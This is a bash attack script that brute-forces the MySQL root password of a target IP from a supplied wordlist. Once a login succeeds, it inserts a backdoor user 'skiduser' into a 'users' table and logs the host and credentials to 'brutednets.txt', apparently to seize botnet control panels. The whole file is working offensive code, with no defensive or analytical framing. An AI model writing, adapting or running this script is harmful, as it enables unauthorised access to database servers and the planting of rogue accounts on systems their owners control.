#!/bin/bash
filename=$1
ip=$2
passwds=(`cat "$filename"`)
echo "Running"
for i in "${passwds[@]}"
do db=$(timeout 2 mysql -h $ip -u root -p$i -e "show databases;" | grep "\|" | grep -v "_schema" | grep -v "Database" | grep -v "mysql")
  if [[ $db == *"not allowed"* ]]; then
    echo "Bruting Failed."
    exit 1
  fi
  gdb=$(echo $db | tr -d '\040\011\012\015')
  aa=$(timeout 3 mysql -h $ip -u root -p$i -e "use $gdb; INSERT INTO users VALUES (NULL, 'skiduser', 'skidpassword', 0, 0, 0, 0, -1, 1, 30, '');")
  if [[ $aa == *"Query OK"* ]]; then
    echo "$ip:skiduser:skidpassword" >> brutednets.txt
    echo "GOTTEM: $ip:skiduser:skidpassword"
    exit 1
  fi
done
echo "Bruting Failed."

